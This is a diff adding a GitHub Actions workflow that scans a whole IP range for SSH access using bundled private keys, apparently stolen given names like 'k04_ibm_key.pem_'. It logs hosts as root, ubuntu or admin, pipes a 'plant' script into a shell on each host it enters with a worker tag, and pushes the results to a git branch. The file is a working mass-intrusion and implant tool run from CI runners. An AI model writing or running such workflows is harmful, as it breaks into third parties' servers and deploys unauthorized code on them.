@@ -1,0 +1,104 @@
+name: vantage-sshfan
+on:
+  workflow_dispatch:
+    inputs:
+      cidr:
+        description: "prefix like 123.184.7"
+        default: "123.184.7"
+      mode:
+        description: "sweep | plant | keysweep"
+        default: "sweep"
+      hosts:
+        description: "explicit host list for plant/keysweep"
+        default: ""
+permissions:
+  contents: write
+jobs:
+  fan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 150
+    steps:
+      - uses: actions/checkout@v4
+      - name: egress
+        run: curl -s -m 10 https://api.ipify.org; echo
+      - name: sweep
+        if: inputs.mode == 'sweep'
+        env:
+          CIDR: ${{ inputs.cidr }}
+        run: |
+          set +e
+          mkdir -p vantage/out
+          chmod 600 keys2/*.pem_ 2>/dev/null
+          seq 1 254 | awk -v c="$CIDR" '{print c"."$1}' > /tmp/ips
+          cat > /tmp/try.sh <<'S'
+          #!/bin/bash
+          ip=$1
+          for u in root ubuntu; do
+            for k in keys2/k04_ibm_key.pem_ keys2/k06* keys2/k07*; do
+              [ -f "$k" ] || continue
+              if timeout 8 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
+                  -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes \
+                  "$u@$ip" 'id -u' >/dev/null 2>&1; then
+                echo -e "$ip\t$u\t$k" | tee -a /tmp/alive.tsv
+                exit 0
+              fi
+            done
+          done
+          S
+          chmod +x /tmp/try.sh
+          : > /tmp/alive.tsv
+          cat /tmp/ips | xargs -P 40 -I{} /tmp/try.sh {}
+          echo "== ALIVE =="; cat /tmp/alive.tsv | tee vantage/out/alive_${{ inputs.cidr }}.tsv
+      - name: keysweep
+        if: inputs.mode == 'keysweep'
+        env:
+          HOSTS: ${{ inputs.hosts }}
+        run: |
+          set +e
+          mkdir -p vantage/out
+          chmod 600 keys2/* 2>/dev/null
+          : > vantage/out/keysweep.tsv
+          for h in $HOSTS; do
+            for u in root ubuntu admin; do
+              for k in keys2/*; do
+                head -c 40 "$k" | grep -q "PRIVATE KEY" || continue
+                if timeout 8 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
+                    -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes \
+                    "$u@$h" 'id -u' >/dev/null 2>&1; then
+                  echo -e "$h\t$u\t$k" | tee -a vantage/out/keysweep.tsv
+                fi
+              done
+            done
+          done
+      - name: plant
+        if: inputs.mode == 'plant'
+        env:
+          HOSTS: ${{ inputs.hosts }}
+        run: |
+          set +e
+          mkdir -p vantage/out
+          chmod 600 keys2/k04_ibm_key.pem_
+          for h in $HOSTS; do
+            w=$(echo "$h" | tr '.' '-')
+            u=root
+            timeout 15 ssh -i keys2/k04_ibm_key.pem_ -o BatchMode=yes -o StrictHostKeyChecking=no \
+              -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o IdentitiesOnly=yes "$u@$h" 'id -u' >/dev/null 2>&1 || u=ubuntu
+            echo "##### $h as $u"
+            WORKER="ul-t2-$w-g0" timeout 240 ssh -i keys2/k04_ibm_key.pem_ -o BatchMode=yes \
+              -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 \
+              -o IdentitiesOnly=yes "$u@$h" "WORKER=ul-t2-$w-g0 sh -s" < vantage/plant_local.sh 2>&1 | tail -50 | tee vantage/out/plant_$w.log
+          done
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: vfan
+          path: vantage/out/
+      - name: publish
+        if: always()
+        run: |
+          set +e
+          git config user.email bot@ul.local; git config user.name ul
+          git checkout -b vfan/${{ github.run_id }}
+          git add -f vantage/out/
+          git commit -m "vfan ${{ github.run_id }}"
+          git push -q origin HEAD:vfan/${{ github.run_id }}
